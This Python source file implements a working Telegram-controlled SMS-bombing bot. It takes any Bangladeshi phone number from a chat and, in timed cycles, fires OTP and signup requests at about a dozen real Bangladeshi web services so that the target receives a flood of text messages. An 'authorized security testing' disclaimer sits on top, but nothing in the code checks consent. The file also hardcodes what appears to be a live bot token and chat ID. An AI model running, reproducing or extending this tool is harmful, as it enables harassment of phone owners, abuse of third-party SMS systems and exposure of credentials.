#!/usr/bin/env python3
"""
SMS Bombing Testing Tool - Telegram Bot
For authorized security testing only
"""

import requests
import asyncio
import json
import time
import random
import re
import sys
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ===== CONFIGURATION =====
BOT_TOKEN = "8840165792:AAG9dR17N6tqWaHpXCLzPng-RYjGb5E0yQI"
CHAT_ID = "6599359441"
LOOP_CYCLES = 10
CYCLE_DELAY = 30

# Store target per chat
user_targets = {}

COMMON_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 12; M2010J19CG Build/SKQ1.211202.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.178 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
}


def parse_phone_number(user_input):
    """Parse user phone input into three required formats."""
    cleaned = user_input.strip().replace(" ", "")
    digits_only = re.sub(r'\D', '', cleaned)

    if cleaned.startswith("+880") and len(digits_only) == 13:
        phone_plus880 = "+" + digits_only
        phone_880 = "0" + digits_only[3:]
        phone_8digit = digits_only[3:]
        if phone_8digit.startswith("0"):
            phone_8digit = phone_8digit[1:]

    elif cleaned.startswith("880") and len(digits_only) >= 11:
        digits_only = digits_only[:13]
        phone_plus880 = "+" + digits_only
        phone_880 = "0" + digits_only[3:]
        phone_8digit = digits_only[3:]
        if phone_8digit.startswith("0"):
            phone_8digit = phone_8digit[1:]

    elif cleaned.startswith("01") and len(digits_only) == 11:
        phone_880 = digits_only
        phone_plus880 = "+880" + digits_only[1:]
        phone_8digit = digits_only[1:]

    elif cleaned.startswith("1") and len(digits_only) == 10:
        phone_8digit = digits_only
        phone_880 = "0" + digits_only
        phone_plus880 = "+880" + digits_only

    else:
        if len(digits_only) >= 10:
            last_10 = digits_only[-10:]
            phone_8digit = last_10
            phone_880 = "0" + last_10
            phone_plus880 = "+880" + last_10
        else:
            return None, None, None

    return phone_880, phone_plus880, phone_8digit


def get_api_definitions(phone_880, phone_plus880, phone_8digit):
    """Generate API definitions with the target phone numbers."""
    return [
        {
            "name": "PKLuck",
            "method": "POST",
            "url": "https://www.pkluck.com/wps/verification/sms/register",
            "headers": {
                "x-real-ua": "TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyOyBNMjAxMEoxOUNHIEJ1aWxkL1NLUTEuMjExMjAyLjAwMSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0OC4wLjc3NzguMTc4IE1vYmlsZSBTYWZhcmkvNTM3LjM2",
                "language": "BN",
                "sec-ch-ua-platform": '"Android"',
                "authorization": "",
                "sec-ch-ua": '"Chromium";v="148", "Android WebView";v="148", "Not/A)Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "merchant": "pklubdtf4",
                "moduleid": "REGMOBVERF3",
                "origin": "https://www.pkluck.com",
                "x-requested-with": "mark.via.gp",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.pkluck.com/m/register",
                "priority": "u=1, i",
                "Content-Type": "application/json",
            },
            "body": {"mobileNo": phone_880, "countryDialingCode": "880"},
        },
        {
            "name": "Redx",
            "method": "POST",
            "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
            "headers": {
                "Content-Type": "application/json",
                "sec-ch-ua": '"Chromium";v="148", "Not/A)Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "origin": "https://merchant.redx.com.bd",
                "referer": "https://merchant.redx.com.bd/",
            },
            "body": {"phoneNumber": phone_880},
        },
        {
            "name": "Garibook",
            "method": "POST",
            "url": "https://api.garibookadmin.com/api/v4/user/login",
            "headers": {
                "Content-Type": "application/json",
                "origin": "https://garibook.com",
                "referer": "https://garibook.com/",
            },
            "body": {"mobile": phone_plus880, "recaptcha_token": "garibookcaptcha", "channel": "web"},
        },
        {
            "name": "Bioscope",
            "method": "POST",
            "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
            "headers": {
                "Content-Type": "application/json",
                "origin": "https://bioscopelive.com",
                "referer": "https://bioscopelive.com/",
            },
            "body": {"number": phone_plus880},
        },
        {
            "name": "TimezoneBD",
            "method": "POST",
            "url": "https://backend.timezonebd.com/api/v1/user/otp-login",
            "headers": {
                "Content-Type": "application/json",
                "origin": "https://timezonebd.com",
                "referer": "https://timezonebd.com/",
            },
            "body": {"phone": phone_8digit},
        },
        {
            "name": "Arogya",
            "method": "POST",
            "url": "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.0.0&os=Android&osv=10",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "origin": "https://arogga.com",
                "referer": "https://arogga.com/",
            },
            "body": f"mobile={phone_880}&fcmToken=&referral=",
            "is_form_data": True,
        },
        {
            "name": "Shikho",
            "method": "POST",
            "url": "https://api.shikho.com/auth/v2/send/sms",
            "headers": {
                "Content-Type": "application/json",
                "origin": "https://shikho.com",
                "referer": "https://shikho.com/",
            },
            "body": {"phone": f"880{phone_8digit}", "type": "student", "auth_type": "signup", "vendor": "shikho"},
        },
        {
            "name": "Apex4U",
            "method": "POST",
            "url": "https://api.apex4u.com/api/auth/login",
            "headers": {
                "Content-Type": "application/json",
                "sec-ch-ua-platform": '"Android"',
                "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "origin": "https://apex4u.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://apex4u.com/",
                "accept-language": "en-US,en;q=0.9,bn;q=0.8,zh-CN;q=0.7,zh-TW;q=0.6,zh;q=0.5",
                "priority": "u=1, i",
            },
            "body": {"phoneNumber": phone_8digit},
        },
        {
            "name": "POC_API",
            "method": "POST",
            "url": "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
            "headers": {
                "Content-Type": "application/json",
                "origin": "https://poc.com",
                "referer": "https://poc.com/",
            },
            "body": {"phone": phone_8digit},
        },
        {
            "name": "Deeptoplay",
            "method": "POST",
            "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
            "headers": {
                "Content-Type": "application/json",
                "origin": "https://deeptoplay.com",
                "referer": "https://deeptoplay.com/",
            },
            "body": {"number": phone_plus880},
        },
        {
            "name": "Toffee_Signup",
            "method": "POST",
            "url": "https://prod-services.toffeelive.com/sms/v1/subscriber/signup",
            "headers": {
                "Content-Type": "application/json",
                "origin": "https://toffeelive.com",
                "referer": "https://toffeelive.com/",
            },
            "body": {"mobile": f"880{phone_8digit}"},
        },
        {
            "name": "Toffee_OTP",
            "method": "POST",
            "url": "https://prod-services.toffeelive.com/sms/v1/subscriber/otp",
            "headers": {
                "Content-Type": "application/json",
                "origin": "https://toffeelive.com",
                "referer": "https://toffeelive.com/",
            },
            "body": {"target": f"880{phone_8digit}", "resend": False},
        },
    ]


def send_request(api, timeout=10):
    """Send a single API request and return the result."""
    headers = {**COMMON_HEADERS, **api.get("headers", {})}
    body = api["body"]

    try:
        if api.get("is_form_data"):
            resp = requests.post(api["url"], data=body, headers=headers, timeout=timeout)
        else:
            resp = requests.post(api["url"], json=body, headers=headers, timeout=timeout)

        return {
            "name": api["name"],
            "status": resp.status_code,
            "success": resp.status_code in [200, 201, 202, 204],
            "response": resp.text[:150],
        }
    except requests.exceptions.Timeout:
        return {"name": api["name"], "status": "TIMEOUT", "success": False, "response": "Timed out"}
    except requests.exceptions.ConnectionError:
        return {"name": api["name"], "status": "CONN_ERR", "success": False, "response": "Connection failed"}
    except Exception as e:
        return {"name": api["name"], "status": "ERROR", "success": False, "response": str(e)[:150]}


async def run_bombing_cycle(chat_id, cycle_num, apis, context):
    """Execute one full cycle of all APIs and send report."""
    results = []

    for api in apis:
        result = send_request(api)
        results.append(result)
        await asyncio.sleep(random.uniform(0.3, 0.8))

    success_count = sum(1 for r in results if r["success"])
    fail_count = len(results) - success_count

    summary = (
        f"🔥 Cycle #{cycle_num} Complete\n"
        f"✅ Success: {success_count}/{len(results)}\n"
        f"❌ Failed: {fail_count}/{len(results)}\n\n"
    )

    for r in results:
        icon = "✅" if r["success"] else "❌"
        summary += f"{icon} {r['name']}: {r['status']}\n"

    await context.bot.send_message(chat_id=chat_id, text=summary)
    return results


async def bombing_task(context: ContextTypes.DEFAULT_TYPE):
    """Background task that runs all cycles."""
    job = context.job
    chat_id = job.chat_id
    phone_880 = job.data["phone_880"]
    phone_plus880 = job.data["phone_plus880"]
    phone_8digit = job.data["phone_8digit"]
    cycles = job.data.get("cycles", LOOP_CYCLES)
    delay = job.data.get("delay", CYCLE_DELAY)

    apis = get_api_definitions(phone_880, phone_plus880, phone_8digit)

    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"🚀 SMS Bombing Started\n"
            f"📱 Target: {phone_880}\n"
            f"🔄 Cycles: {cycles}\n"
            f"📡 APIs: {len(apis)}\n"
            f"⏱ Cycle delay: {delay}s"
        )
    )

    for cycle in range(1, cycles + 1):
        await run_bombing_cycle(chat_id, cycle, apis, context)

        if cycle < cycles:
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"⏳ Waiting {delay}s before cycle {cycle + 1}..."
            )
            await asyncio.sleep(delay)

    total_requests = cycles * len(apis)
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"✅ Bombing Complete\n"
            f"📊 Total requests: {total_requests}\n"
            f"🔄 Cycles: {cycles}\n"
            f"📱 Target: {phone_880}"
        )
    )


# ===== TELEGRAM COMMAND HANDLERS =====

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command."""
    await update.message.reply_text(
        "🔥 *SMS Bombing Bot*\n\n"
        "Send me a Bangladeshi phone number to start bombing.\n"
        "Supported formats:\n"
        "• `01318908813`\n"
        "• `+8801318908813`\n"
        "• `8801318908813`\n\n"
        "Commands:\n"
        "/start - Show this message\n"
        "/stop - Stop current bombing\n"
        "/status - Check if bombing is running",
        parse_mode="Markdown"
    )


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stop command."""
    chat_id = update.effective_chat.id
    jobs = context.job_queue.get_jobs_by_name(str(chat_id))
    
    if jobs:
        for job in jobs:
            job.schedule_removal()
        await update.message.reply_text("⛔ Bombing stopped.")
    else:
        await update.message.reply_text("No bombing is currently running.")


async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command."""
    chat_id = update.effective_chat.id
    jobs = context.job_queue.get_jobs_by_name(str(chat_id))
    
    if jobs:
        await update.message.reply_text("🟢 Bombing is currently running.")
    else:
        await update.message.reply_text("🔴 No bombing is running. Send a phone number to start.")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle phone number input from user."""
    chat_id = update.effective_chat.id
    text = update.message.text.strip()

    # Check if bombing is already running
    existing_jobs = context.job_queue.get_jobs_by_name(str(chat_id))
    if existing_jobs:
        await update.message.reply_text("⚠️ Bombing is already running! Use /stop first.")
        return

    # Parse the phone number
    phone_880, phone_plus880, phone_8digit = parse_phone_number(text)

    if not phone_880:
        await update.message.reply_text(
            "❌ Invalid phone number. Please send a valid Bangladeshi number.\n"
            "Example: `01318908813` or `+8801318908813`",
            parse_mode="Markdown"
        )
        return

    # Show parsed info
    msg = (
        f"✅ Number parsed successfully!\n\n"
        f"📱 01XXXXXXXXX: `{phone_880}`\n"
        f"📱 +8801XXXXXXX: `{phone_plus880}`\n"
        f"📱 1XXXXXXXXX: `{phone_8digit}`\n\n"
        f"🔄 Starting {LOOP_CYCLES} cycles with {CYCLE_DELAY}s delay...\n"
        f"Use /stop to cancel."
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

    # Schedule the bombing task
    context.job_queue.run_once(
        bombing_task,
        when=1,  # Start after 1 second
        data={
            "phone_880": phone_880,
            "phone_plus880": phone_plus880,
            "phone_8digit": phone_8digit,
            "cycles": LOOP_CYCLES,
            "delay": CYCLE_DELAY,
        },
        name=str(chat_id),
        chat_id=chat_id,
    )


async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors."""
    print(f"Error: {context.error}")


def main():
    """Main entry point."""
    print(r"""
  ╔══════════════════════════════════════╗
  ║     SMS BOMBING TESTING TOOL         ║
  ║       Telegram Bot Controller        ║
  ║   Authorized Security Testing Only   ║
  ╚══════════════════════════════════════╝
    """)

    # Create application
    app = Application.builder().token(BOT_TOKEN).build()

    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)

    print("[*] Bot is running... Send a phone number on Telegram to start.")
    print("[*] Press Ctrl+C to stop.\n")

    # Start polling
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Exiting.")
        sys.exit(0)